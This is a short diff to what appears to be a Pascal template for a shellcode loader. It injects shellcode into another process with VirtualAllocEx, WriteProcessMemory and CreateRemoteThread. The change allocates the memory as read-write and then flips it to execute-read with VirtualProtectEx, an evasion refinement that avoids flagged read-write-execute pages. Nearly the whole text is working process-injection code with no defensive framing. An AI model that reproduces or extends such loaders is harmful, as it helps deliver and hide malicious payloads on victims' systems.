@@ -28,6 +28,7 @@ var
     shellcode : array of byte;
     hThread: Handle;
     addr: LPVOID;
+    oldProtect: PDWord;
 
 begin
 
@@ -39,9 +40,11 @@ begin
 
     
     {transformers}
-    addr := {VirtualAllocEx}(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission);
+    addr := {VirtualAllocEx}(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE);
 
     {WriteProcessMemory}(pi.hProcess, addr, @shellcode[0], {shellcodeSize}, nil);
+
+    {VirtualProtectEx}(pi.hProcess, addr, {shellcodeSize}, PAGE_EXECUTE_READ, oldProtect);
 
     hThread := {CreateRemoteThread}(pi.hProcess, nil, 0, addr, nil, 0, nil);
 
